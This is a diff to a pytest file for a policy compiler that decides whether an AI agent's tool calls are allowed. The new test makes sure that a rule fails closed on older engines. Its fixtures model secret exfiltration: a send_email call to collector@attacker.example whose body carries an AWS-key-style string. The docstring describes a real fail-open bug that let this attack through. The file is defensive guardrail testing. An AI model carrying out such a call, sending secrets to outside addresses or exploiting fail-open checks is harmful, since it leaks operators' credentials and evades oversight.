@@ -336,9 +336,17 @@ def test_denial_names_the_closest_rule_and_the_clause_that_failed() -> None:
     payload = _call("send_email", {"to": "collector@attacker.example", "body": "hello"})
     reason = _eval(_BASE_INTENT, payload, "reason")
     assert "notify-customer" in reason
+    # THE substance: the operator is told WHICH clause refused, not merely that nothing matched.
     assert "param_paths.to matches" in reason
-    # 4 predicates: direction, verb, param_paths.to, data_classes
-    assert "met 3/4" in reason
+    # Exactly ONE clause failed — the recipient. Asserted as a count rather than a literal "met 3/4",
+    # because the denominator is the rule's predicate total and legitimately moves whenever the
+    # compiler adds a predicate (it went 4 -> 6 when per-root availability predicates were added to
+    # close a fail-open). Pinning the ratio made this test fail for a reason that was not a defect,
+    # while a real regression — the near miss naming the WRONG clause — would have slipped past both.
+    met, total = (int(n) for n in re.search(r"met (\d+)/(\d+)", reason).groups())
+    assert total - met == 1, reason
+    # And the version-skew guard is NOT what failed here: this payload is from a current engine.
+    assert "published by this engine" not in reason
 
 
 @pytest.mark.skipif(_OPA is None, reason="opa binary required")
@@ -633,3 +641,47 @@ def test_a_multi_value_in_still_explains_its_near_miss() -> None:
     reason = _eval(intent, _call("wire_transfer", {}), "reason")
     assert "closest multi" in reason
     assert "tool_name in" in reason
+
+
+@pytest.mark.skipif(_OPA is None, reason="opa binary required")
+def test_a_scoping_predicate_does_not_fail_open_on_an_engine_without_the_fact() -> None:
+    """The most serious defect this compiler has had, found on a live cluster rather than by reading.
+
+    The collection operators compile to counted comprehensions, and a comprehension whose body is
+    undefined yields the EMPTY ARRAY rather than becoming undefined. So on an engine that does not
+    publish `data_classes` / `destinations`, `count([]) == 0` is TRUE — `noneOf` and `subsetOf` are
+    vacuously satisfied, the rule matches, and the intent ALLOWS precisely the call it exists to refuse.
+
+    Observed: the same `send_email` to an attacker address carrying an AWS key evaluated `allow`
+    against an AKS engine predating these facts and `block` against one carrying them.
+    """
+    intent = {
+        "name": "no-secret-egress", "class": "support-bot",
+        "call": [{
+            "id": "mail-acme",
+            "match": {"tool_name": "send_email"},
+            "require": {"data_classes": {"noneOf": ["secret"]},
+                        "destinations.emails": {"subsetOf": ["ops@acme.com"]}},
+        }],
+    }
+    attacker = {
+        "tool_name": "send_email", "direction": "call",
+        "tool_params": {"to": "collector@attacker.example", "body": "AKIAIOSFODNN7EXAMPLE"},
+        "agent": {"agent_class": "support-bot", "namespace": "agents"}, "call_depth": 0,
+    }
+    old_engine = {**attacker, "derived": {"verb": "send", "tool_kind": "other", "param_values": [],
+                                          "param_values_lower": [], "sql_normalized": "", "sql_statements": []}}
+    current = {**attacker, "derived": {**old_engine["derived"], "data_classes": ["secret"],
+                                       "destinations": {"emails": ["collector@attacker.example"],
+                                                        "urls": [], "hosts": [], "schemes": []}}}
+    assert _eval(intent, current) == "block"
+    # The whole point: an engine that cannot evaluate the scope must DENY, not admit.
+    assert _eval(intent, old_engine) == "block"
+    # And it must say why, or the operator diagnoses a version skew as a broken policy and removes it.
+    assert "published by this engine" in _eval(intent, old_engine, "reason")
+
+    # A legitimate call on a CURRENT engine is unaffected — the guard must not deny everything.
+    ok = {**attacker, "tool_params": {"to": "ops@acme.com", "body": "hi"},
+          "derived": {**old_engine["derived"], "data_classes": [],
+                      "destinations": {"emails": ["ops@acme.com"], "urls": [], "hosts": [], "schemes": []}}}
+    assert _eval(intent, ok) == "allow"
